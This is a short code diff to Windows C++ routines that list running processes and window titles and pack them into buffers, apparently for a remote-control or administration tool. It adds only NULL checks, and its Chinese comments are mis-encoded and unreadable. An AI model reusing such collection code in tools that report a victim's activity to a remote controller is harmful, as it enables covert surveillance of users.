@@ -78,7 +78,8 @@ LPBYTE CSystemManager::GetProcessList()
 	HMODULE			hModules = NULL;   //½ø³ÌÖĞµÚÒ»¸öÄ£¿éµÄ¾ä±ú
 
 	LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);       //ÔİÊ±·ÖÅäÒ»ÏÂ»º³åÇø
-
+	if (szBuffer == NULL)
+		return NULL;
 	szBuffer[0] = TOKEN_PSLIST;                      //×¢ÒâÕâ¸öÊÇÊı¾İÍ· 
 	dwOffset = 1;
 
@@ -263,12 +264,15 @@ BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam)  //ÒªÊı¾
 	//Í¬½ø³Ì¹ÜÀíÒ»ÑùÎÒÃÇ×¢ÒâËûµÄ·¢ËÍµ½Ö÷¿Ø¶ËµÄÊı¾İ½á¹¹
 	if (szBuffer == NULL)
 		szBuffer = (LPBYTE)LocalAlloc(LPTR, 1);  //ÔİÊ±·ÖÅä»º³åÇø 
-
+	if (szBuffer == NULL)
+		return FALSE;
 	//[ÏûÏ¢][4Notepad.exe\0]
 	dwLength = sizeof(DWORD) + lstrlen(szTitle) + 1;
 	dwOffset = LocalSize(szBuffer);  //1
 	//ÖØĞÂ¼ÆËã»º³åÇø´óĞ¡
 	szBuffer = (LPBYTE)LocalReAlloc(szBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
+	if (szBuffer == NULL)
+		return FALSE;
 	//ÏÂÃæÁ½¸ömemcpy¾ÍÄÜ¿´µ½Êı¾İ½á¹¹Îª hwnd+´°¿Ú±êÌâ+0
 	memcpy((szBuffer+dwOffset),&hWnd,sizeof(DWORD));
 	memcpy(szBuffer + dwOffset + sizeof(DWORD), szTitle, lstrlen(szTitle) + 1);
